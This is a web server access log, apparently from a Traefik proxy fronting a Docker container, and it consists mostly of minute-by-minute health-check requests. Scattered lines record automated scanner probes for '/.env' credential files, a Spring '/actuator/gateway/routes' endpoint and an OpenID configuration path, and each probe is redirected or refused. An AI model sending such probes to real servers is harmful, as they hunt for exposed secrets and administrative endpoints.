159.203.109.206 - - [18/Dec/2023:13:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5205 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:13:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5206 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:13:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5207 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5208 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:13:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5209 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5210 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:13:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5211 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5212 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:13:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5213 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5214 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:13:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5215 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:13:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5216 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:13:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5217 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5218 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:13:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5219 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5220 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:13:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5221 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5222 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:13:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5223 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5224 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:13:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5225 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:13:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5226 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:13:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5227 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5228 "www@docker" "http://172.18.0.9:80" 1ms
83.97.73.87 - - [18/Dec/2023:13:41:40 +0000] "GET /actuator/gateway/routes HTTP/1.1" 301 17 "-" "-" 5229 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [18/Dec/2023:13:41:41 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 5230 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:13:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5231 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5232 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:13:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5233 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5234 "www@docker" "http://172.18.0.9:80" 4ms
159.203.109.206 - - [18/Dec/2023:13:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5235 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5236 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:13:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5237 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:13:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5238 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:13:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5239 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5240 "www@docker" "http://172.18.0.9:80" 0ms
83.97.73.87 - - [18/Dec/2023:13:46:52 +0000] "GET /actuator/gateway/routes HTTP/1.1" 301 17 "-" "-" 5241 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [18/Dec/2023:13:46:53 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 5242 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:13:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5243 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5244 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:13:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5245 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5246 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:13:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5247 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5248 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:13:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5249 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:13:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5250 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:13:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5251 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5252 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:13:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5253 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5254 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:13:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5255 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5256 "www@docker" "http://172.18.0.9:80" 0ms
54.36.115.221 - - [18/Dec/2023:13:53:51 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 5257 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [18/Dec/2023:13:53:51 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 5258 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:13:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5259 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5260 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:13:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5261 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5262 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:13:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5263 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5264 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:13:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5265 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5266 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [18/Dec/2023:13:58:20 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5267 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:13:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5268 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:13:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5269 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:13:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5270 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:13:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5271 "www@docker" "http://172.18.0.9:80" 0ms
192.155.88.231 - - [18/Dec/2023:14:00:22 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5272 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:14:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5273 "www@docker" "http://172.18.0.9:80" 0ms
172.104.11.46 - - [18/Dec/2023:14:00:29 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5274 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:14:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5275 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5276 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5277 "www@docker" "http://172.18.0.9:80" 1ms
167.94.146.53 - - [18/Dec/2023:14:01:41 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5278 "-" "-" 0ms
167.94.146.53 - - [18/Dec/2023:14:01:44 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5279 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:14:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5280 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5281 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5282 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5283 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5284 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5285 "www@docker" "http://172.18.0.9:80" 1ms
90.151.171.106 - - [18/Dec/2023:14:04:58 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 5286 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [18/Dec/2023:14:05:08 +0000] "GET /?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 5287 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:14:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5288 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:14:05:35 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5289 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:14:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5290 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5291 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5292 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5293 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5294 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5295 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:14:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5296 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5297 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5298 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5299 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5300 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5301 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:14:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5302 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5303 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5304 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5305 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5306 "www@docker" "http://172.18.0.9:80" 0ms
180.149.125.167 - - [18/Dec/2023:14:13:52 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5307 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:14:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5308 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5309 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5310 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5311 "www@docker" "http://172.18.0.9:80" 1ms
95.214.235.169 - - [18/Dec/2023:14:16:01 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 5312 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [18/Dec/2023:14:16:03 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 5313 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:14:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5314 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5315 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5316 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5317 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5318 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:14:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5319 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5320 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5321 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5322 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5323 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5324 "www@docker" "http://172.18.0.9:80" 1ms
159.223.136.180 - - [18/Dec/2023:14:21:36 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5325 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:14:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5326 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5327 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5328 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5329 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5330 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5331 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5332 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5333 "www@docker" "http://172.18.0.9:80" 1ms
128.14.134.134 - - [18/Dec/2023:14:25:35 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5334 "web-to-websecure@internal" "-" 0ms
128.14.134.134 - - [18/Dec/2023:14:25:35 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5335 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:14:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5336 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5337 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5338 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5339 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5340 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5341 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:14:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5342 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5343 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5344 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5345 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5346 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5347 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:14:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5348 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5349 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5350 "www@docker" "http://172.18.0.9:80" 0ms
91.215.85.61 - - [18/Dec/2023:14:32:43 +0000] "GET /oauth/idp/.well-known/openid-configuration HTTP/1.1" 404 19 "-" "-" 5351 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:14:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5352 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5353 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5354 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5355 "www@docker" "http://172.18.0.9:80" 0ms
209.141.60.74 - - [18/Dec/2023:14:34:53 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5356 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:14:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5357 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5358 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5359 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5360 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5361 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5362 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5363 "www@docker" "http://172.18.0.9:80" 2ms
167.71.120.76 - - [18/Dec/2023:14:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5364 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5365 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:14:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5366 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [18/Dec/2023:14:39:41 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 5367 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [18/Dec/2023:14:39:43 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 5368 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:14:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5369 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:14:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5370 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5371 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:14:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5372 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5373 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:14:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5374 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5375 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5376 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5377 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5378 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5379 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:14:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5380 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5381 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:14:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5382 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5383 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:14:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5384 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5385 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:14:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5386 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5387 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5388 "www@docker" "http://172.18.0.9:80" 1ms
